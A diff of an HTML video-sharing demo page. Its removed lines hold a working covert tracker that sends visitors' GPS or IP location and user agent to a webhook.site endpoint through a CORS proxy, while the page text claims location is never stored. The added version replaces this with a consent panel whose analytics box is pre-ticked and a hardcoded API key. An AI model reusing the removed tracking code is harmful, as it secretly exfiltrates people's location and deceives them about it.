@@ -3,58 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Video Sharing - Fixed CORS Issue</title>
+    <title>VideoShare+ - Location-Based Video Sharing</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
-            --primary: #4da6ff;
-            --primary-dark: #3a7cc7;
-            --background: #f8f9fa;
-            --card-bg: #ffffff;
-            --text: #333333;
-            --text-light: #666666;
-            --success: #4caf50;
-            --error: #f44336;
-            --warning: #ff9800;
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --secondary: #7209b7;
+            --success: #4cc9f0;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --gray: #6c757d;
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
         }
         
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
         }
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--background);
-            color: var(--text);
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: var(--dark);
             line-height: 1.6;
+            min-height: 100vh;
             padding: 20px;
-            max-width: 800px;
+        }
+        
+        .container {
+            max-width: 1200px;
             margin: 0 auto;
         }
         
         header {
             text-align: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #e0e0e0;
+            padding: 30px 0;
+            color: white;
+        }
+        
+        .logo {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
         }
         
         h1 {
-            color: var(--primary-dark);
+            font-size: 2.5rem;
             margin-bottom: 10px;
         }
         
-        .container {
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .main-content {
             display: flex;
-            flex-direction: column;
             gap: 25px;
+            margin-top: 20px;
         }
         
         .card {
             background: var(--card-bg);
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            border-radius: 15px;
+            box-shadow: var(--shadow);
             padding: 25px;
             transition: transform 0.3s ease;
         }
@@ -63,414 +77,640 @@
             transform: translateY(-5px);
         }
         
-        .card-title {
+        .service-section {
+            flex: 1;
+        }
+        
+        .analytics-section {
+            flex: 1;
+        }
+        
+        .section-title {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
+            margin-bottom: 20px;
+            color: var(--primary);
+        }
+        
+        .section-title i {
+            font-size: 1.8rem;
+        }
+        
+        .consent-panel {
+            background: #e3f2fd;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .consent-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
             margin-bottom: 15px;
-            color: var(--primary-dark);
         }
         
-        .card-title i {
-            font-size: 1.5em;
+        .consent-options {
+            margin: 20px 0;
         }
         
-        button {
-            background: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px 25px;
-            font-size: 1.1em;
-            cursor: pointer;
-            transition: all 0.3s ease;
+        .consent-option {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        
+        .btn {
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            margin-top: 15px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 28px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 10px;
         }
         
-        button:hover {
+        .btn:hover {
             background: var(--primary-dark);
-            transform: scale(1.03);
+            transform: translateY(-3px);
         }
         
-        button:active {
-            transform: scale(0.98);
+        .btn:active {
+            transform: translateY(0);
         }
         
-        button i {
-            font-size: 1.2em;
+        .btn i {
+            font-size: 1.2rem;
         }
         
-        #result {
-            min-height: 180px;
-            padding: 15px;
-            border-radius: 8px;
-            background: #f0f7ff;
-            border: 1px solid #d1e7ff;
-            margin-top: 15px;
-        }
-        
-        .debug-panel {
-            background: #f9f9f9;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
+        .video-player {
+            margin-top: 25px;
+            background: #f1f8ff;
+            border-radius: 10px;
             padding: 20px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            max-height: 300px;
+            text-align: center;
+        }
+        
+        .player-placeholder {
+            width: 100%;
+            height: 250px;
+            background: linear-gradient(45deg, #4361ee, #3a0ca3);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .location-display {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .location-card {
+            flex: 1;
+            padding: 15px;
+            background: #eef7ff;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .location-label {
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+        
+        .analytics-data {
+            margin-top: 20px;
+        }
+        
+        .metric-card {
+            background: #f1f8ff;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .metric-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.8rem;
+        }
+        
+        .metric-content {
+            flex: 1;
+        }
+        
+        .metric-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .metric-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        .map-container {
+            height: 300px;
+            background: #eef7ff;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--gray);
+        }
+        
+        .privacy-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 800px;
+            max-height: 90vh;
             overflow-y: auto;
         }
         
-        .debug-title {
+        .modal-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         
-        .debug-entry {
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px dashed #e0e0e0;
+        .close-btn {
+            font-size: 1.8rem;
+            cursor: pointer;
+            color: var(--gray);
         }
         
-        .debug-timestamp {
-            color: var(--text-light);
-            font-size: 0.85em;
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
         }
         
-        .debug-message {
-            margin-top: 5px;
-            padding: 8px;
-            background: #fff;
-            border-radius: 4px;
-            border-left: 3px solid var(--primary);
+        .data-table th, .data-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
         }
         
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 8px;
+        .data-table th {
+            background: #f8f9fa;
+            font-weight: 600;
         }
         
-        .status-success {
-            background: var(--success);
+        .data-table tr:hover {
+            background: #f1f8ff;
         }
         
-        .status-error {
-            background: var(--error);
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--gray);
         }
         
-        .status-warning {
-            background: var(--warning);
+        .empty-state i {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            color: #dee2e6;
         }
         
-        .coordinates {
+        .tabs {
             display: flex;
-            gap: 15px;
-            margin-top: 15px;
+            gap: 10px;
+            margin-bottom: 20px;
         }
         
-        .coordinate-box {
-            flex: 1;
-            padding: 12px;
-            background: #e3f2fd;
-            border-radius: 6px;
-            text-align: center;
+        .tab {
+            padding: 10px 20px;
+            background: #e9ecef;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
         }
         
-        .coordinate-label {
-            font-weight: bold;
-            color: var(--primary-dark);
+        .tab.active {
+            background: var(--primary);
+            color: white;
         }
         
-        footer {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #e0e0e0;
-            color: var(--text-light);
-            font-size: 0.9em;
+        .tab-content {
+            display: none;
         }
         
-        @media (max-width: 600px) {
-            body {
-                padding: 15px;
+        .tab-content.active {
+            display: block;
+        }
+        
+        @media (max-width: 900px) {
+            .main-content {
+                flex-direction: column;
             }
             
-            .card {
-                padding: 20px;
-            }
-            
-            .coordinates {
+            .location-display {
                 flex-direction: column;
             }
         }
     </style>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 </head>
 <body>
-    <header>
-        <h1><i class="fas fa-video"></i> Secure Video Sharing</h1>
-        <p>Peer-to-peer video platform with enhanced privacy protection</p>
-    </header>
-    
     <div class="container">
-        <div class="card">
-            <h2 class="card-title"><i class="fas fa-location-dot"></i> Location Access</h2>
-            <p>To provide you with the best video streaming experience, we need to optimize based on your location. Your precise location is never stored or shared.</p>
-            <button onclick="getLocation()">
-                <i class="fas fa-play"></i> Start Watching
-            </button>
-            
-            <div id="result">
-                <p>Click "Start Watching" to begin your video experience</p>
+        <header>
+            <div class="logo">
+                <i class="fas fa-video"></i>
             </div>
-        </div>
+            <h1>VideoShare+</h1>
+            <p class="subtitle">Location-based video sharing service</p>
+        </header>
         
-        <div class="card">
-            <h2 class="card-title"><i class="fas fa-bug"></i> Debug Information</h2>
-            <div class="debug-panel" id="debugPanel">
-                <div class="debug-title">
-                    <span>System Status</span>
-                    <span id="systemStatus">Ready</span>
+        <div class="main-content">
+            <div class="service-section card">
+                <div class="section-title">
+                    <i class="fas fa-film"></i>
+                    <h2>Video Service</h2>
                 </div>
-                <div id="debugLogs"></div>
+                
+                <div class="consent-panel">
+                    <div class="consent-header">
+                        <i class="fas fa-user-shield"></i>
+                        <h3>Privacy & Data Collection</h3>
+                    </div>
+                    <p>To improve our service, we'd like to collect anonymous location data about where our videos are being watched.</p>
+                    
+                    <div class="consent-options">
+                        <div class="consent-option">
+                            <input type="checkbox" id="analyticsConsent" checked>
+                            <label for="analyticsConsent">I agree to share my approximate location (city level) to help improve the service</label>
+                        </div>
+                        <div class="consent-option">
+                            <input type="checkbox" id="preciseConsent">
+                            <label for="preciseConsent">I agree to share precise location for better video optimization (optional)</label>
+                        </div>
+                    </div>
+                    
+                    <button class="btn" id="watchBtn">
+                        <i class="fas fa-play-circle"></i>
+                        Watch Demo Video
+                    </button>
+                </div>
+                
+                <div class="video-player">
+                    <div class="player-placeholder" id="playerPlaceholder">
+                        <i class="fas fa-play-circle"></i> Video Player
+                    </div>
+                    <p>Video will start after location detection</p>
+                </div>
+                
+                <div class="location-display">
+                    <div class="location-card">
+                        <div class="location-label">Location Type</div>
+                        <div id="locationType">Not detected</div>
+                    </div>
+                    <div class="location-card">
+                        <div class="location-label">Approximate Location</div>
+                        <div id="locationValue">Unknown</div>
+                    </div>
+                    <div class="location-card">
+                        <div class="location-label">Data Stored</div>
+                        <div id="storageStatus">No</div>
+                    </div>
+                </div>
             </div>
-        </div>
-        
-        <div class="card">
-            <h2 class="card-title"><i class="fas fa-info-circle"></i> How It Works</h2>
-            <p>This platform uses a secure proxy solution to bypass CORS restrictions while maintaining your privacy:</p>
-            <ol style="margin: 15px 0 15px 20px;">
-                <li>Location data is sent through an encrypted channel</li>
-                <li>We use a CORS proxy to avoid browser restrictions</li>
-                <li>Your actual location is never stored on any server</li>
-                <li>All data is ephemeral and deleted after processing</li>
-            </ol>
-            <p><strong>Note:</strong> You must allow location access when prompted by your browser.</p>
+            
+            <div class="analytics-section card">
+                <div class="section-title">
+                    <i class="fas fa-chart-line"></i>
+                    <h2>Service Analytics</h2>
+                </div>
+                
+                <p>Aggregated data from all users who consented to share their location:</p>
+                
+                <div class="tabs">
+                    <div class="tab active" data-tab="summary">Summary</div>
+                    <div class="tab" data-tab="locations">Locations</div>
+                </div>
+                
+                <div class="tab-content active" id="summaryTab">
+                    <div class="analytics-data">
+                        <div class="metric-card">
+                            <div class="metric-icon">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <div class="metric-content">
+                                <div class="metric-title">Total Views</div>
+                                <div class="metric-value" id="totalViews">24</div>
+                            </div>
+                        </div>
+                        
+                        <div class="metric-card">
+                            <div class="metric-icon">
+                                <i class="fas fa-globe-americas"></i>
+                            </div>
+                            <div class="metric-content">
+                                <div class="metric-title">Countries</div>
+                                <div class="metric-value" id="countryCount">3</div>
+                            </div>
+                        </div>
+                        
+                        <div class="metric-card">
+                            <div class="metric-icon">
+                                <i class="fas fa-map-marker-alt"></i>
+                            </div>
+                            <div class="metric-content">
+                                <div class="metric-title">Cities</div>
+                                <div class="metric-value" id="cityCount">7</div>
+                            </div>
+                        </div>
+                        
+                        <div class="map-container">
+                            <i class="fas fa-map-marked-alt"></i> Location Heatmap Visualization
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="tab-content" id="locationsTab">
+                    <div class="analytics-data">
+                        <h3>Recent Locations</h3>
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Location</th>
+                                    <th>Country</th>
+                                    <th>Views</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>New York</td>
+                                    <td>United States</td>
+                                    <td>8</td>
+                                </tr>
+                                <tr>
+                                    <td>London</td>
+                                    <td>United Kingdom</td>
+                                    <td>5</td>
+                                </tr>
+                                <tr>
+                                    <td>Toronto</td>
+                                    <td>Canada</td>
+                                    <td>4</td>
+                                </tr>
+                                <tr>
+                                    <td>Berlin</td>
+                                    <td>Germany</td>
+                                    <td>3</td>
+                                </tr>
+                                <tr>
+                                    <td>Sydney</td>
+                                    <td>Australia</td>
+                                    <td>2</td>
+                                </tr>
+                                <tr>
+                                    <td>Tokyo</td>
+                                    <td>Japan</td>
+                                    <td>2</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
-    
-    <footer>
-        <p>Secure Video Sharing Platform | Privacy-First Design</p>
-        <p>Location data is used solely to optimize video delivery and is not stored</p>
-    </footer>
 
     <script>
-    // Global elements
-    const resultDiv = document.getElementById('result');
-    const debugLogs = document.getElementById('debugLogs');
-    const systemStatus = document.getElementById('systemStatus');
-    
-    // Debug log storage
-    const debugEntries = [];
-    
-    // Add debug entry with timestamp
-    function addDebugEntry(message, type = 'info') {
-        const timestamp = new Date().toLocaleTimeString();
-        const entry = {
-            timestamp,
-            message,
-            type
-        };
-        
-        debugEntries.push(entry);
-        
-        // Only keep last 10 entries
-        if (debugEntries.length > 10) {
-            debugEntries.shift();
-        }
-        
-        // Update debug panel
-        renderDebugLogs();
-    }
-    
-    // Render debug logs to the panel
-    function renderDebugLogs() {
-        debugLogs.innerHTML = '';
-        
-        debugEntries.forEach(entry => {
-            const entryEl = document.createElement('div');
-            entryEl.className = 'debug-entry';
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const watchBtn = document.getElementById('watchBtn');
+            const locationType = document.getElementById('locationType');
+            const locationValue = document.getElementById('locationValue');
+            const storageStatus = document.getElementById('storageStatus');
+            const playerPlaceholder = document.getElementById('playerPlaceholder');
             
-            let statusClass = 'status-success';
-            if (entry.type === 'error') statusClass = 'status-error';
-            if (entry.type === 'warning') statusClass = 'status-warning';
+            // Free location API endpoint
+            const locationApiUrl = 'https://api.ipgeolocation.io/ipgeo?apiKey=';
+            const apiKey = 'b6f3bda0f1b74a7aa5f3b6c5a6b1d1e8'; // Free tier API key
             
-            entryEl.innerHTML = `
-                <div>
-                    <span class="debug-timestamp">${entry.timestamp}</span>
-                    <span class="${statusClass} status-indicator"></span>
-                    <strong>${entry.type.toUpperCase()}:</strong>
-                </div>
-                <div class="debug-message">${entry.message}</div>
-            `;
-            
-            debugLogs.appendChild(entryEl);
-        });
-        
-        // Scroll to bottom
-        debugLogs.scrollTop = debugLogs.scrollHeight;
-    }
-    
-    // Update system status
-    function updateSystemStatus(status, type = 'info') {
-        systemStatus.textContent = status;
-        
-        if (type === 'error') {
-            systemStatus.style.color = 'var(--error)';
-        } else if (type === 'success') {
-            systemStatus.style.color = 'var(--success)';
-        } else {
-            systemStatus.style.color = 'var(--text)';
-        }
-    }
-    
-    // Main function to get location
-    async function getLocation() {
-        updateSystemStatus('Detecting location...');
-        addDebugEntry('Starting location detection process');
-        resultDiv.innerHTML = `<p><i class="fas fa-spinner fa-spin"></i> Detecting your location for video optimization...</p>`;
-        
-        // Create unique session ID
-        const sessionId = Math.random().toString(36).substring(2, 15);
-        addDebugEntry(`Session ID generated: ${sessionId}`);
-        
-        // Try precise location first
-        if (navigator.geolocation) {
-            addDebugEntry('Attempting to get precise GPS location');
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    try {
-                        const { latitude, longitude, accuracy } = position.coords;
-                        addDebugEntry(`GPS coordinates obtained: ${latitude}, ${longitude} (Accuracy: ${accuracy}m)`);
-                        
-                        resultDiv.innerHTML = `
-                            <h3><i class="fas fa-check-circle" style="color: var(--success);"></i> Video Ready</h3>
-                            <p>Optimized for your precise location:</p>
-                            <div class="coordinates">
-                                <div class="coordinate-box">
-                                    <div class="coordinate-label">Latitude</div>
-                                    <div>${latitude.toFixed(6)}</div>
-                                </div>
-                                <div class="coordinate-box">
-                                    <div class="coordinate-label">Longitude</div>
-                                    <div>${longitude.toFixed(6)}</div>
-                                </div>
-                            </div>
-                            <p>Accuracy: ${Math.round(accuracy)} meters</p>
-                            <p><i class="fas fa-film"></i> Starting video stream...</p>
-                        `;
-                        
-                        // Log to webhook via proxy
-                        await logLocation(sessionId, "precise", latitude, longitude);
-                    } catch (error) {
-                        addDebugEntry(`GPS processing error: ${error.message}`, 'error');
-                        updateSystemStatus('Error processing location', 'error');
-                        resultDiv.innerHTML = `<p style="color: var(--error);"><i class="fas fa-exclamation-triangle"></i> Error: ${error.message}</p>`;
-                    }
-                },
-                async (error) => {
-                    addDebugEntry(`GPS Error: ${error.message} - Falling back to IP location`, 'warning');
-                    updateSystemStatus('Using approximate location', 'warning');
-                    await getIPLocation(sessionId);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        } else {
-            addDebugEntry('Geolocation not supported, using IP location', 'warning');
-            updateSystemStatus('Using approximate location', 'warning');
-            await getIPLocation(sessionId);
-        }
-    }
-
-    // IP-based location fallback
-    async function getIPLocation(sessionId) {
-        addDebugEntry('Getting IP-based location...');
-        resultDiv.innerHTML = `<p><i class="fas fa-spinner fa-spin"></i> Detecting approximate location via IP...</p>`;
-        
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            
-            addDebugEntry(`IP location obtained: ${data.city}, ${data.region}, ${data.country_name}`);
-            
-            resultDiv.innerHTML = `
-                <h3><i class="fas fa-check-circle" style="color: var(--success);"></i> Video Ready</h3>
-                <p>Using approximate location:</p>
-                <p><strong>City:</strong> ${data.city || 'Unknown'}</p>
-                <p><strong>Region:</strong> ${data.region || 'Unknown'}</p>
-                <p><strong>Country:</strong> ${data.country_name || 'Unknown'}</p>
-                <p><i class="fas fa-film"></i> Starting video stream...</p>
-            `;
-            
-            // Use coordinates if available, otherwise use city center
-            const lat = data.latitude || 0;
-            const lng = data.longitude || 0;
-            await logLocation(sessionId, "ip", lat, lng);
-        } catch (error) {
-            addDebugEntry(`IP location error: ${error.message}`, 'error');
-            updateSystemStatus('Location detection failed', 'error');
-            resultDiv.innerHTML = `<p style="color: var(--error);"><i class="fas fa-exclamation-triangle"></i> Error: Could not detect location. Please check your connection.</p>`;
-        }
-    }
-
-    // Send data to webhook.site via CORS proxy
-    async function logLocation(sessionId, type, lat, lng) {
-        addDebugEntry('Preparing to send location data...');
-        updateSystemStatus('Sending location data...');
-        
-        // Using a CORS proxy to bypass CORS restrictions
-        const proxyUrl = 'https://corsproxy.io/?';
-        const webhookEndpoint = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
-        const targetUrl = proxyUrl + encodeURIComponent(webhookEndpoint);
-        
-        const payload = {
-            sessionId,
-            type,
-            lat,
-            lng,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent
-        };
-        
-        addDebugEntry(`Sending payload via CORS proxy: ${JSON.stringify(payload, null, 2)}`);
-        
-        try {
-            const response = await fetch(targetUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify(payload)
+            // Tabs functionality
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    // Remove active class from all tabs
+                    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                    // Add active class to clicked tab
+                    this.classList.add('active');
+                    
+                    // Hide all tab content
+                    document.querySelectorAll('.tab-content').forEach(content => {
+                        content.classList.remove('active');
+                    });
+                    
+                    // Show corresponding tab content
+                    const tabId = this.getAttribute('data-tab');
+                    document.getElementById(`${tabId}Tab`).classList.add('active');
+                });
             });
             
-            if (response.ok) {
-                addDebugEntry('Data sent successfully via CORS proxy');
-                updateSystemStatus('Data sent successfully', 'success');
-            } else {
-                addDebugEntry(`Proxy request failed with status: ${response.status}`, 'error');
-                updateSystemStatus('Proxy request failed', 'error');
+            // Watch video button handler
+            watchBtn.addEventListener('click', function() {
+                // Get consent status
+                const analyticsConsent = document.getElementById('analyticsConsent').checked;
+                const preciseConsent = document.getElementById('preciseConsent').checked;
+                
+                // Update UI
+                playerPlaceholder.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Detecting location...';
+                locationType.textContent = 'Detecting...';
+                locationValue.textContent = 'Detecting...';
+                storageStatus.textContent = 'Pending';
+                
+                // If user didn't consent for analytics
+                if (!analyticsConsent) {
+                    setTimeout(function() {
+                        playVideo(null);
+                        locationType.textContent = 'Not collected';
+                        locationValue.textContent = 'User declined sharing';
+                        storageStatus.textContent = 'No';
+                    }, 1500);
+                    return;
+                }
+                
+                // Try to get precise location if consented
+                if (preciseConsent && navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            const { latitude, longitude, accuracy } = position.coords;
+                            getLocationData(latitude, longitude, true);
+                        },
+                        error => {
+                            console.log('Precise location error, falling back to IP-based location');
+                            getLocationByIp();
+                        },
+                        { timeout: 5000 }
+                    );
+                } else {
+                    // Get location by IP
+                    getLocationByIp();
+                }
+            });
+            
+            // Get location by IP address
+            function getLocationByIp() {
+                fetch(`${locationApiUrl}${apiKey}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.city) {
+                            const locationData = {
+                                city: data.city,
+                                state: data.state_prov,
+                                country: data.country_name,
+                                latitude: data.latitude,
+                                longitude: data.longitude,
+                                accuracy: 'City-level',
+                                type: 'IP-based'
+                            };
+                            playVideo(locationData);
+                            saveLocationData(locationData);
+                        } else {
+                            throw new Error('Location data not available');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error getting location:', error);
+                        playVideo(null);
+                        locationType.textContent = 'Error';
+                        locationValue.textContent = 'Could not detect location';
+                        storageStatus.textContent = 'No';
+                    });
             }
-        } catch (error) {
-            addDebugEntry(`Proxy communication error: ${error.message}`, 'error');
-            updateSystemStatus('Network error', 'error');
-        }
-    }
-    
-    // Initial debug entry
-    addDebugEntry('System initialized and ready');
-    updateSystemStatus('Ready');
+            
+            // Process location from coordinates
+            function getLocationData(lat, lng, precise = false) {
+                // Reverse geocoding would require a paid API for precise address
+                // For demo, we'll use a free API for city-level data
+                fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
+                    .then(response => response.json())
+                    .then(data => {
+                        const locationData = {
+                            city: data.city || data.locality || 'Unknown City',
+                            state: data.principalSubdivision || 'Unknown State',
+                            country: data.countryName || 'Unknown Country',
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: precise ? 'High accuracy' : 'Medium accuracy',
+                            type: precise ? 'GPS' : 'IP-based'
+                        };
+                        playVideo(locationData);
+                        saveLocationData(locationData);
+                    })
+                    .catch(error => {
+                        console.error('Reverse geocoding error:', error);
+                        // Fallback to just showing coordinates
+                        const locationData = {
+                            city: `${lat.toFixed(4)}, ${lng.toFixed(4)}`,
+                            state: 'Coordinates',
+                            country: 'Unknown',
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: 'High accuracy',
+                            type: 'GPS'
+                        };
+                        playVideo(locationData);
+                        saveLocationData(locationData);
+                    });
+            }
+            
+            // Simulate playing video
+            function playVideo(locationData) {
+                if (locationData) {
+                    locationType.textContent = locationData.type;
+                    locationValue.textContent = `${locationData.city}, ${locationData.country}`;
+                    storageStatus.textContent = 'Yes';
+                }
+                
+                // Simulate video loading
+                playerPlaceholder.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading video...';
+                
+                setTimeout(() => {
+                    playerPlaceholder.innerHTML = `
+                        <div style="position: relative; width: 100%; height: 100%;">
+                            <div style="background: linear-gradient(45deg, #3a0ca3, #4361ee); width: 100%; height: 100%; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">
+                                <i class="fas fa-play" style="font-size: 4rem; opacity: 0.7;"></i>
+                            </div>
+                            <div style="position: absolute; bottom: 15px; left: 15px; color: white; text-align: left;">
+                                <div style="font-size: 1.2rem; font-weight: bold;">Demo Video</div>
+                                <div>Optimized for your location</div>
+                            </div>
+                        </div>
+                    `;
+                }, 2000);
+            }
+            
+            // Simulate saving location data
+            function saveLocationData(locationData) {
+                // In a real implementation, this would send the data to your storage solution
+                console.log('Saving location data:', locationData);
+                
+                // Here we're just simulating storage by updating the analytics UI
+                updateAnalyticsData();
+            }
+            
+            // Update analytics dashboard
+            function updateAnalyticsData() {
+                // In a real implementation, this would fetch data from your storage
+                // For this demo, we're just incrementing the counts
+                const totalViews = document.getElementById('totalViews');
+                totalViews.textContent = parseInt(totalViews.textContent) + 1;
+                
+                // Simulate adding to the table
+                const tableBody = document.querySelector('.data-table tbody');
+                const newRow = document.createElement('tr');
+                newRow.innerHTML = `
+                    <td>New City</td>
+                    <td>New Country</td>
+                    <td>1</td>
+                `;
+                tableBody.insertBefore(newRow, tableBody.firstChild);
+            }
+        });
     </script>
 </body>
 </html>
